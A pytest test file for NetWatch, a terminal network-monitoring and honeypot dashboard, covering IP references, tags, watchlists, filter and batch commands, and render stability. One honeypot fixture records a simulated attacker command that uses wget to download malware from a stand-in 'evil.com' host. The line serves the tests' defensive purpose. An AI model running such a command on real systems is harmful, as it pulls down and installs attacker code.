"""
Tests for NetWatch UI rendering fixes and new features:
  - @N IP reference resolution
  - IP list retrieval from all sources
  - Tags, notes, watchlist
  - Batch command handlers
  - Smart filter commands
  - Console mode transitions
  - Render frame stability
  - Help overlay completeness
  - No crashes on empty/populated state
"""
import os
import sys
import time
import threading
import pytest
from unittest.mock import patch, MagicMock
from datetime import datetime, timezone

import netwatch


# ─── helper to populate state ───

def _populate_hosts():
    for i in range(1, 6):
        netwatch.hosts[f"10.0.1.{i}"] = {
            "bytes_in": 1000 * i, "bytes_out": 500 * i, "packets": 10 * i,
            "ports": {80, 443} if i % 2 == 0 else {22},
            "protocols": {"TCP"}, "first_seen": datetime.now(timezone.utc),
            "last_seen": datetime.now(timezone.utc),
            "hostname": f"host{i}.local", "resolved": True,
            "threat_score": i * 5, "tags": set(),
        }
    # External IPs
    netwatch.hosts["203.0.113.10"] = {
        "bytes_in": 5000, "bytes_out": 2000, "packets": 50,
        "ports": {80, 443, 8080}, "protocols": {"TCP", "HTTP"},
        "first_seen": datetime.now(timezone.utc),
        "last_seen": datetime.now(timezone.utc),
        "hostname": "external.example.com", "resolved": True,
        "threat_score": 30, "tags": {"SCANNER"},
    }


def _populate_honeypot():
    events = [
        {"time": "10:00:01", "service": "telnet", "ip": "198.51.100.1",
         "summary": "login admin/1234", "data": {}},
        {"time": "10:00:05", "service": "credential", "ip": "198.51.100.2",
         "summary": "admin:password", "data": {}},
        {"time": "10:00:10", "service": "telnet_cmd", "ip": "198.51.100.1",
         "summary": "cmd: wget http://evil.com/malware", "data": {}},
        {"time": "10:01:00", "service": "rtsp", "ip": "192.0.2.5",
         "summary": "RTSP probe", "data": {}},
    ]
    netwatch.honeypot_events.extend(events)
    return events


# ═══════════════════════════════════════════════════════════
#  @N REFERENCE SYSTEM
# ═══════════════════════════════════════════════════════════

class TestIPReferences:
    def test_resolve_plain_ip(self):
        result = netwatch._resolve_target("10.0.1.5")
        assert result == "10.0.1.5"

    def test_resolve_at_reference(self):
        _populate_hosts()
        ip_list = netwatch._get_ip_list("hosts")
        assert len(ip_list) > 0
        result = netwatch._resolve_target("@1")
        assert result == ip_list[0]

    def test_resolve_hash_reference(self):
        _populate_hosts()
        ip_list = netwatch._get_ip_list("hosts")
        result = netwatch._resolve_target("#1")
        assert result == ip_list[0]

    def test_resolve_out_of_range(self):
        _populate_hosts()
        result = netwatch._resolve_target("@999")
        assert result is None

    def test_resolve_at_with_text(self):
        result = netwatch._resolve_target("@abc")
        assert result == "abc"

    def test_handle_command_resolves_at_ref(self):
        _populate_hosts()
        netwatch.current_tab = "hosts"
        ip_list = netwatch._get_ip_list("hosts")
        first_ip = ip_list[0]
        netwatch.handle_command(f"tag @1 test-tag")
        assert netwatch.ip_tags.get(first_ip) == "test-tag"


# ═══════════════════════════════════════════════════════════
#  IP LIST RETRIEVAL
# ═══════════════════════════════════════════════════════════

class TestIPLists:
    def test_get_hosts_list(self):
        _populate_hosts()
        result = netwatch._get_ip_list("hosts")
        assert len(result) == 6  # 5 local + 1 external

    def test_get_attackers_list(self):
        _populate_honeypot()
        result = netwatch._get_ip_list("attackers")
        assert len(result) == 3  # 3 unique attacker IPs

    def test_get_arp_list(self):
        netwatch.arp_table["10.0.1.1"] = {"mac": "aa:bb:cc:dd:ee:ff", "state": "REACHABLE"}
        netwatch.arp_table["10.0.1.2"] = {"mac": "11:22:33:44:55:66", "state": "STALE"}
        result = netwatch._get_ip_list("arp")
        assert len(result) == 2

    def test_get_nmap_list(self):
        netwatch.nmap_results.append({"time": "10:00", "line": "Nmap scan report for 10.0.1.5"})
        netwatch.nmap_results.append({"time": "10:01", "line": "22/tcp open ssh on 10.0.1.6"})
        result = netwatch._get_ip_list("nmap")
        assert len(result) == 2

    def test_get_watchlist(self):
        netwatch.watchlist.add("1.2.3.4")
        netwatch.watchlist.add("5.6.7.8")
        result = netwatch._get_ip_list("watchlist")
        assert len(result) == 2

    def test_get_empty_list(self):
        result = netwatch._get_ip_list("hosts")
        assert result == []

    def test_hosts_sorted_by_traffic(self):
        netwatch.hosts["10.0.1.1"] = {
            "bytes_in": 100, "bytes_out": 50, "ports": set(),
            "first_seen": None, "last_seen": None, "hostname": "",
            "resolved": False, "threat_score": 0, "tags": set(), "protocols": set(),
        }
        netwatch.hosts["10.0.1.2"] = {
            "bytes_in": 9999, "bytes_out": 5000, "ports": set(),
            "first_seen": None, "last_seen": None, "hostname": "",
            "resolved": False, "threat_score": 0, "tags": set(), "protocols": set(),
        }
        result = netwatch._get_ip_list("hosts")
        assert result[0] == "10.0.1.2"  # highest traffic first

    def test_auto_uses_current_tab(self):
        _populate_hosts()
        netwatch.current_tab = "hosts"
        result = netwatch._get_ip_list("auto")
        assert len(result) > 0


# ═══════════════════════════════════════════════════════════
#  TAGS, NOTES, WATCHLIST
# ═══════════════════════════════════════════════════════════

class TestTagsNotesWatchlist:
    def test_tag_add(self):
        netwatch.handle_command("tag 10.0.1.1 router")
        assert netwatch.ip_tags["10.0.1.1"] == "router"

    def test_tag_multiword(self):
        netwatch.handle_command("tag 10.0.1.1 main gateway device")
        assert netwatch.ip_tags["10.0.1.1"] == "main gateway device"

    def test_tag_remove(self):
        netwatch.ip_tags["10.0.1.1"] = "router"
        netwatch.handle_command("tag rm 10.0.1.1")
        assert "10.0.1.1" not in netwatch.ip_tags

    def test_tag_list(self):
        netwatch.ip_tags["10.0.1.1"] = "router"
        netwatch.ip_tags["10.0.1.2"] = "server"
        netwatch.handle_command("tag list")
        output = "\n".join(netwatch.console_output)
        assert "router" in output
        assert "server" in output

    def test_note_add(self):
        netwatch.handle_command("note 10.0.1.1 suspicious traffic pattern")
        assert len(netwatch.ip_notes["10.0.1.1"]) == 1
        assert "suspicious traffic pattern" in netwatch.ip_notes["10.0.1.1"][0]

    def test_note_multiple(self):
        netwatch.handle_command("note 10.0.1.1 first note")
        netwatch.handle_command("note 10.0.1.1 second note")
        assert len(netwatch.ip_notes["10.0.1.1"]) == 2

    def test_note_show(self):
        netwatch.ip_notes["10.0.1.1"] = ["test note"]
        netwatch.handle_command("note show 10.0.1.1")
        output = "\n".join(netwatch.console_output)
        assert "test note" in output

    def test_watch_add(self):
        netwatch.handle_command("watch 10.0.1.1")
        assert "10.0.1.1" in netwatch.watchlist

    def test_watch_remove(self):
        netwatch.watchlist.add("10.0.1.1")
        netwatch.handle_command("watch rm 10.0.1.1")
        assert "10.0.1.1" not in netwatch.watchlist

    def test_watch_list(self):
        netwatch.watchlist.add("10.0.1.1")
        netwatch.watchlist.add("10.0.1.2")
        netwatch.handle_command("watch list")
        output = "\n".join(netwatch.console_output)
        assert "10.0.1.1" in output
        assert "10.0.1.2" in output

    def test_watch_list_empty(self):
        netwatch.handle_command("watch list")
        output = "\n".join(netwatch.console_output)
        assert "empty" in output.lower()


# ═══════════════════════════════════════════════════════════
#  SMART FILTER COMMANDS
# ═══════════════════════════════════════════════════════════

class TestSmartFilters:
    def test_ips_command(self):
        _populate_hosts()
        netwatch.handle_command("ips hosts")
        output = "\n".join(netwatch.console_output)
        assert "10.0.1" in output
        assert "@" in output  # numbered references

    def test_top_command(self):
        _populate_hosts()
        netwatch.handle_command("top 3")
        output = "\n".join(netwatch.console_output)
        assert "TOP" in output
        assert "@" in output

    def test_top_default(self):
        _populate_hosts()
        netwatch.handle_command("top")
        assert len(netwatch.console_output) > 1

    def test_sus_with_threat_hosts(self):
        _populate_hosts()
        netwatch.handle_command("sus")
        output = "\n".join(netwatch.console_output)
        assert "SUSPICIOUS" in output or "suspicious" in output.lower()

    def test_sus_with_honeypot_only(self):
        _populate_honeypot()
        netwatch.handle_command("sus")
        output = "\n".join(netwatch.console_output)
        assert "198.51.100" in output or "attacker" in output.lower()

    def test_loud_command(self):
        _populate_hosts()
        netwatch.handle_command("loud")
        output = "\n".join(netwatch.console_output)
        assert "LOUDEST" in output

    def test_quiet_command(self):
        _populate_hosts()
        netwatch.handle_command("quiet")
        output = "\n".join(netwatch.console_output)
        assert "QUIETEST" in output

    def test_services_command(self):
        _populate_hosts()
        netwatch.handle_command("services")
        output = "\n".join(netwatch.console_output)
        assert "SERVICES" in output

    def test_ports_command(self):
        _populate_hosts()
        netwatch.handle_command("ports 80")
        output = "\n".join(netwatch.console_output)
        assert "PORT 80" in output

    def test_ports_no_results(self):
        _populate_hosts()
        netwatch.handle_command("ports 9999")
        output = "\n".join(netwatch.console_output)
        assert "No hosts" in output or "no hosts" in output.lower()

    def test_summary_command(self):
        _populate_hosts()
        _populate_honeypot()
        netwatch.handle_command("summary")
        output = "\n".join(netwatch.console_output)
        assert "SUMMARY" in output
        assert "Hosts:" in output
        assert "Honeypot:" in output

    def test_whowatch_command(self):
        _populate_honeypot()
        netwatch.handle_command("whowatch")
        output = "\n".join(netwatch.console_output)
        assert "198.51.100" in output

    def test_find_by_ip(self):
        _populate_hosts()
        netwatch.handle_command("find 10.0.1.3")
        output = "\n".join(netwatch.console_output)
        assert "10.0.1.3" in output

    def test_find_by_hostname(self):
        _populate_hosts()
        netwatch.handle_command("find host3")
        output = "\n".join(netwatch.console_output)
        assert "host3" in output

    def test_find_in_honeypot(self):
        _populate_honeypot()
        netwatch.handle_command("find admin")
        output = "\n".join(netwatch.console_output)
        assert "admin" in output

    def test_find_in_tags(self):
        netwatch.ip_tags["10.0.1.1"] = "important-router"
        netwatch.handle_command("find router")
        output = "\n".join(netwatch.console_output)
        assert "router" in output

    def test_find_no_results(self):
        netwatch.handle_command("find zzznonexistent")
        output = "\n".join(netwatch.console_output)
        assert "0 matches" in output

    def test_new_command_recent(self):
        netwatch.hosts["10.0.1.99"] = {
            "bytes_in": 100, "bytes_out": 50, "packets": 5,
            "ports": set(), "protocols": set(),
            "first_seen": datetime.now(timezone.utc),
            "last_seen": datetime.now(timezone.utc),
            "hostname": "new-host", "resolved": True,
            "threat_score": 0, "tags": set(),
        }
        netwatch.handle_command("new 60")
        output = "\n".join(netwatch.console_output)
        assert "10.0.1.99" in output

    def test_new_command_no_recent(self):
        netwatch.handle_command("new 1")
        output = "\n".join(netwatch.console_output)
        assert "NEW" in output
        assert "0" in output


# ═══════════════════════════════════════════════════════════
#  TIMELINE & REPORT
# ═══════════════════════════════════════════════════════════

class TestTimelineReport:
    def test_timeline_with_events(self):
        _populate_honeypot()
        netwatch.handle_command("timeline 198.51.100.1")
        output = "\n".join(netwatch.console_output)
        assert "TIMELINE" in output
        assert "telnet" in output

    def test_timeline_no_events(self):
        netwatch.handle_command("timeline 1.2.3.4")
        output = "\n".join(netwatch.console_output)
        assert "No events" in output

    def test_timeline_with_notes(self):
        _populate_honeypot()
        netwatch.ip_notes["198.51.100.1"] = ["suspicious scanning"]
        netwatch.handle_command("timeline 198.51.100.1")
        output = "\n".join(netwatch.console_output)
        assert "suspicious scanning" in output

    @patch("netwatch.LOG_DIR", "/tmp/netwatch_test_logs")
    def test_report_generates_file(self):
        os.makedirs("/tmp/netwatch_test_logs", exist_ok=True)
        _populate_hosts()
        _populate_honeypot()
        netwatch.ip_tags["203.0.113.10"] = "attacker"
        # Report runs in thread, call directly
        netwatch.handle_command("report 203.0.113.10")
        time.sleep(0.5)
        output = "\n".join(netwatch.console_output)
        assert "Report saved" in output or "report" in output.lower()


# ═══════════════════════════════════════════════════════════
#  BATCH OPERATIONS (don't actually run nmap)
# ═══════════════════════════════════════════════════════════

class TestBatchOps:
    def test_scanall_no_ips(self):
        netwatch.handle_command("scanall attackers")
        output = "\n".join(netwatch.console_output)
        assert "No IPs" in output

    def test_blockall_safety(self):
        netwatch.handle_command("blockall hosts")
        output = "\n".join(netwatch.console_output)
        assert "Safety" in output or "safety" in output.lower()

    @patch("netwatch.HAS_RAW_NET", True)
    @patch("netwatch.subprocess.run")
    def test_blockall_attackers(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0)
        _populate_honeypot()
        netwatch.handle_command("blockall attackers")
        output = "\n".join(netwatch.console_output)
        assert "BLOCKING" in output
        assert mock_run.called

    @patch("netwatch.osint_geolocate")
    def test_geoall_no_external(self, mock_geo):
        # Only internal IPs
        netwatch.hosts["10.0.1.1"] = {
            "bytes_in": 100, "bytes_out": 50, "ports": set(),
            "first_seen": None, "last_seen": None, "hostname": "",
            "resolved": False, "threat_score": 0, "tags": set(), "protocols": set(),
        }
        netwatch.handle_command("geoall hosts")
        output = "\n".join(netwatch.console_output)
        assert "No external" in output


# ═══════════════════════════════════════════════════════════
#  DIFFARP
# ═══════════════════════════════════════════════════════════

class TestDiffArp:
    @patch("netwatch.subprocess.run")
    def test_diffarp_detects_new(self, mock_run):
        mock_run.return_value = MagicMock(
            stdout="? (10.0.1.99) at aa:bb:cc:dd:ee:ff [ether] on eth0\n",
            returncode=0
        )
        netwatch.handle_command("diffarp")
        time.sleep(0.3)
        output = "\n".join(netwatch.console_output)
        assert "DIFF" in output or "ARP" in output


# ═══════════════════════════════════════════════════════════
#  RENDER FRAME STABILITY
# ═══════════════════════════════════════════════════════════

class TestRenderFrameStability:
    def test_render_skips_in_console_mode(self):
        netwatch.console_mode = True
        # Should not crash or produce output
        netwatch._render_frame()
        netwatch.console_mode = False

    def test_render_nonblocking_lock(self):
        """Render should skip if lock is held, not block."""
        netwatch._render_lock.acquire()
        try:
            start = time.time()
            netwatch._render_frame()
            elapsed = time.time() - start
            assert elapsed < 0.1  # should skip instantly
        finally:
            netwatch._render_lock.release()

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_render_produces_output(self, mock_size, mock_write):
        _populate_hosts()
        netwatch.console_mode = False
        netwatch._input_active = False
        netwatch._render_frame()
        assert mock_write.called

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_render_with_help_overlay(self, mock_size, mock_write):
        netwatch.show_help_overlay = True
        netwatch._render_frame()
        assert mock_write.called
        # Check the output contains help content
        written = mock_write.call_args[0][1].decode('utf-8', errors='replace')
        assert "COMMAND REFERENCE" in written

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_render_all_tabs_no_crash(self, mock_size, mock_write):
        _populate_hosts()
        _populate_honeypot()
        netwatch.proto_stats["TCP"] = 100
        netwatch.arp_table["10.0.1.1"] = {"mac": "aa:bb:cc:dd:ee:ff", "state": "REACHABLE"}
        netwatch.alerts.append({"time": "10:00", "msg": "test"})
        netwatch.osint_results.append({"time": "10:00", "type": "GEO", "target": "1.2.3.4", "result": "test"})
        for tab in netwatch.TABS:
            netwatch.current_tab = tab
            netwatch._render_frame()
        assert mock_write.call_count >= len(netwatch.TABS)

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(60, 24))
    def test_render_small_terminal(self, mock_size, mock_write):
        _populate_hosts()
        netwatch._render_frame()
        assert mock_write.called

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(200, 60))
    def test_render_large_terminal(self, mock_size, mock_write):
        _populate_hosts()
        netwatch._render_frame()
        assert mock_write.called

    @patch("os.write", side_effect=OSError("broken pipe"))
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_render_handles_broken_pipe(self, mock_size, mock_write):
        """Should not raise on OSError (e.g. pipe closed)."""
        netwatch._render_frame()

    def test_render_concurrent_safety(self):
        """Multiple threads calling render should not crash."""
        _populate_hosts()
        errors = []
        def render_loop():
            try:
                for _ in range(10):
                    with patch("os.write"), patch("os.get_terminal_size", return_value=(80, 40)):
                        netwatch._render_frame()
                    time.sleep(0.01)
            except Exception as e:
                errors.append(e)
        threads = [threading.Thread(target=render_loop) for _ in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_render_shows_console_output_inline(self, mock_size, mock_write):
        """Dashboard should show recent console output."""
        netwatch.console_output.extend(["test output line 1", "test output line 2"])
        netwatch._input_active = False
        netwatch._render_frame()
        written = mock_write.call_args[0][1].decode('utf-8', errors='replace')
        assert "test output line" in written

    @patch("os.write")
    @patch("os.get_terminal_size", return_value=(80, 40))
    def test_cursor_hidden_during_render(self, mock_size, mock_write):
        netwatch._render_frame()
        written = mock_write.call_args[0][1].decode('utf-8', errors='replace')
        assert "\033[?25l" in written  # cursor hide
        assert "\033[?25h" in written  # cursor show


# ═══════════════════════════════════════════════════════════
#  HELP OVERLAY COMPLETENESS
# ═══════════════════════════════════════════════════════════

class TestHelpOverlayComplete:
    def test_help_contains_new_commands(self):
        lines = netwatch._build_help_overlay(120, 60)
        text = "\n".join(lines)
        new_cmds = [
            "fullrecon", "sweep", "scanall", "geoall", "whoisall", "reconall",
            "blockall", "ips", "top", "new", "sus", "loud", "quiet",
            "find", "ports", "services", "country", "whowatch", "summary",
            "timeline", "report", "tag", "note", "watch", "exportips", "diffarp",
        ]
        for cmd in new_cmds:
            assert cmd in text, f"Help overlay missing command: {cmd}"

    def test_help_contains_at_reference_docs(self):
        lines = netwatch._build_help_overlay(120, 60)
        text = "\n".join(lines)
        assert "@N" in text or "@1" in text

    def test_help_contains_batch_ops_section(self):
        lines = netwatch._build_help_overlay(120, 60)
        text = "\n".join(lines)
        assert "Batch" in text

    def test_help_contains_smart_filters_section(self):
        lines = netwatch._build_help_overlay(120, 60)
        text = "\n".join(lines)
        assert "Smart Filters" in text

    def test_help_contains_tags_section(self):
        lines = netwatch._build_help_overlay(120, 60)
        text = "\n".join(lines)
        assert "Tags" in text


# ═══════════════════════════════════════════════════════════
#  CONSOLE MODE TRANSITIONS
# ═══════════════════════════════════════════════════════════

class TestConsoleModeTransitions:
    def test_console_mode_blocks_render(self):
        netwatch.console_mode = True
        with patch("os.write") as mock_write:
            netwatch._render_frame()
        mock_write.assert_not_called()

    def test_dashboard_command_exits_console(self):
        netwatch.console_mode = True
        netwatch.handle_command("dashboard")
        assert netwatch.console_mode == False

    def test_back_command_exits_console(self):
        """'back' should also exit console mode."""
        # The 'back' alias is only in the main loop's console input handler,
        # not in handle_command — handle_command("dashboard") does it
        netwatch.console_mode = True
        netwatch.handle_command("dashboard")
        assert netwatch.console_mode == False

    def test_redraw_event_signals_refresh(self):
        netwatch._redraw_event.clear()
        assert not netwatch._redraw_event.is_set()
        netwatch._redraw_event.set()
        assert netwatch._redraw_event.is_set()

    def test_render_lock_free_after_console(self):
        """After console exit, render lock must be available."""
        netwatch.console_mode = False
        netwatch._input_active = False
        assert netwatch._render_lock.acquire(blocking=False)
        netwatch._render_lock.release()

    def test_render_works_after_console_flag_clear(self):
        """_render_frame should produce output when console_mode=False."""
        _populate_hosts()
        netwatch.console_mode = False
        netwatch._input_active = False
        with patch("os.write") as mock_write, \
             patch("os.get_terminal_size", return_value=(80, 40)):
            netwatch._render_frame()
        assert mock_write.called

    def test_input_active_blocks_render(self):
        """_render_frame must not write when _input_active is True."""
        netwatch._input_active = True
        with patch("os.write") as mock_write:
            netwatch._render_frame()
        mock_write.assert_not_called()

    def test_render_frame_cursor_visible(self):
        """Frame output must end with cursor-show escape."""
        netwatch.console_mode = False
        netwatch._input_active = False
        written = []
        with patch("os.write", side_effect=lambda fd, data: written.append(data)), \
             patch("os.get_terminal_size", return_value=(80, 40)):
            netwatch._render_frame()
        if written:
            last = written[-1]
            if isinstance(last, bytes):
                last = last.decode('utf-8', errors='replace')
            assert "\033[?25h" in last


# ═══════════════════════════════════════════════════════════
#  EXEC CONSOLE CMD
# ═══════════════════════════════════════════════════════════

class TestExecConsoleCmd:
    def test_status_in_console(self, capsys):
        netwatch.total_packets = 42
        netwatch._exec_console_cmd("status")
        out = capsys.readouterr().out
        assert "42" in out
        assert "STATUS" in out

    def test_help_in_console(self, capsys):
        netwatch._exec_console_cmd("help")
        out = capsys.readouterr().out
        assert "COMMANDS" in out
        assert "fullrecon" in out
        assert "scanall" in out
        assert "@N" in out

    def test_unknown_cmd_routes_to_handle_command(self, capsys):
        _populate_hosts()
        netwatch._exec_console_cmd("top 3")
        out = capsys.readouterr().out
        assert "TOP" in out

    def test_console_clears_buffer_before_cmd(self):
        netwatch.console_output.extend(["stale1", "stale2"])
        with patch("builtins.print"):
            netwatch._exec_console_cmd("summary")
        # stale output should have been cleared
        # new output from summary should be present

    def test_status_shows_tags_and_watchlist(self, capsys):
        netwatch.ip_tags["10.0.1.1"] = "router"
        netwatch.watchlist.add("10.0.1.2")
        netwatch._exec_console_cmd("status")
        out = capsys.readouterr().out
        assert "Tags:" in out
        assert "Watchlist:" in out


# ═══════════════════════════════════════════════════════════
#  EXPORTIPS
# ═══════════════════════════════════════════════════════════

class TestExportIPs:
    @patch("netwatch.LOG_DIR", "/tmp/netwatch_test_logs")
    def test_exportips_writes_file(self):
        os.makedirs("/tmp/netwatch_test_logs", exist_ok=True)
        _populate_hosts()
        netwatch.handle_command("exportips hosts")
        output = "\n".join(netwatch.console_output)
        assert "Exported" in output
        assert "6 IPs" in output  # 5 local + 1 external

    def test_exportips_empty(self):
        netwatch.handle_command("exportips hosts")
        output = "\n".join(netwatch.console_output)
        assert "No IPs" in output


# ═══════════════════════════════════════════════════════════
#  EDGE CASES
# ═══════════════════════════════════════════════════════════

class TestEdgeCases:
    def test_empty_command_no_crash(self):
        netwatch.handle_command("")
        netwatch.handle_command("   ")

    def test_unknown_command(self):
        netwatch.handle_command("zzzzinvalid")
        output = "\n".join(netwatch.console_output)
        assert "Unknown" in output

    def test_tag_no_args(self):
        netwatch.handle_command("tag")
        output = "\n".join(netwatch.console_output)
        assert "Usage" in output

    def test_note_no_args(self):
        netwatch.handle_command("note")
        output = "\n".join(netwatch.console_output)
        assert "Usage" in output

    def test_watch_no_args(self):
        netwatch.handle_command("watch")
        output = "\n".join(netwatch.console_output)
        assert "Usage" in output

    def test_find_no_pattern(self):
        netwatch.handle_command("find")
        output = "\n".join(netwatch.console_output)
        assert "Usage" in output

    def test_at_ref_with_empty_list(self):
        result = netwatch._resolve_target("@1")
        assert result is None

    def test_ips_unknown_list(self):
        netwatch.handle_command("ips blahblah")
        output = "\n".join(netwatch.console_output)
        assert "No IPs" in output or len(output) >= 0

    def test_rapid_tab_switches(self):
        """Rapid tab switching should not crash."""
        for tab in netwatch.TABS * 3:
            netwatch.handle_command(tab)
        assert netwatch.current_tab in netwatch.TABS

    def test_concurrent_handle_command(self):
        """Multiple threads calling handle_command."""
        _populate_hosts()
        errors = []
        def cmd_loop():
            try:
                for _ in range(20):
                    netwatch.handle_command("top 5")
                    netwatch.handle_command("summary")
            except Exception as e:
                errors.append(e)
        threads = [threading.Thread(target=cmd_loop) for _ in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert len(errors) == 0
